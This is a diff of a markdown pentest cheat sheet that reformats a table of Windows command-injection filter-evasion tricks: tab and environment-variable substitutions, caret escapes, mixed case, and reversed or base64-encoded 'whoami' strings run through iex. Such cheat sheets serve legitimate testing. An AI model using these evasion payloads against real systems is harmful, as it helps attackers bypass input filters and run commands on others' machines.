@@ -201,18 +201,18 @@ Searching for subdomains and other information on the sources provided in the so
 #### Windows 
 | Command                                                                                                      | Description                                   |
 |--------------------------------------------------------------------------------------------------------------|-----------------------------------------------|
-| %09                                                                                                          | 	Using tabs instead of spaces                 |
-| %PROGRAMFILES:~10,-5%                                                                                        | 	Will be replaced with a space - (CMD)        |
-| $env:PROGRAMFILES\[10]                                                                                       | 	Will be replaced with a space - (PowerShell) | 
-| %HOMEPATH:~0,-17% 	                                                                                          | Will be replaced with \ - (CMD)               |
-| $env:HOMEPATH\[0] 	                                                                                          | Will be replaced with \ - (PowerShell)        |
-| ' or " 	                                                                                                     | Total must be even                            |
-| ^                                                                                                            | 	Windows only (CMD)                           | 
-| WhoAmi                                                                                                       | 	Simply send the character with odd cases     | 
-| "whoami"\[-1..-20] -join ''                                                                                  | 	Reverse a string                             |
-| iex "$('imaohw'\[-1..-20] -join '')"                                                                         | 	Execute reversed command                     | 
-| \[Convert]::ToBase64String(\[System.Text.Encoding]::Unicode.GetBytes('whoami'))                              | 	Encode a string with base64                  |
-| iex "$(\[System.Text.Encoding]::Unicode.GetString(\[System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))" | 	Execute b64 encoded string                   |
+| ```%09```                                                                                                          | 	Using tabs instead of spaces                 |
+| ```%PROGRAMFILES:~10,-5%```                                                                                        | 	Will be replaced with a space - (CMD)        |
+| ```$env:PROGRAMFILES\[10]```                                                                                       | 	Will be replaced with a space - (PowerShell) | 
+| ```%HOMEPATH:~0,-17%``` 	                                                                                          | Will be replaced with \ - (CMD)               |
+| ```$env:HOMEPATH\[0]``` 	                                                                                          | Will be replaced with \ - (PowerShell)        |
+| ```' or "``` 	                                                                                                     | Total must be even                            |
+| ```^```                                                                                                            | 	Windows only (CMD)                           | 
+| ```WhoAmi```                                                                                                       | 	Simply send the character with odd cases     | 
+| ```"whoami"\[-1..-20] -join ''```                                                                                  | 	Reverse a string                             |
+| ```iex "$('imaohw'\[-1..-20] -join '')"```                                                                         | 	Execute reversed command                     | 
+| ```[Convert]::ToBase64String(\[System.Text.Encoding]::Unicode.GetBytes('whoami'))```                              | 	Encode a string with base64                  |
+| ```iex "$(\[System.Text.Encoding]::Unicode.GetString(\[System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"``` | 	Execute b64 encoded string                   |
 
 # Login Brute forcing
 
